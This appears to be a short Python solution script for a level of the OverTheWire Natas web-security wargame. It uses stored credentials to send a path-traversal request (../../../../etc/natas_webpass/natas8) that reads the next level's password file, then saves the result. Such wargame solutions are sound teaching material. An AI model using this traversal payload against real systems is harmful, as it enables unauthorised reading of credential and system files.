from requests import get, post
from sys import argv

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

# URL identified from provided source
URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

resp = get(URL, auth=(username, password))

lines = resp.text.split('\n')

new_password = lines[-7]

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
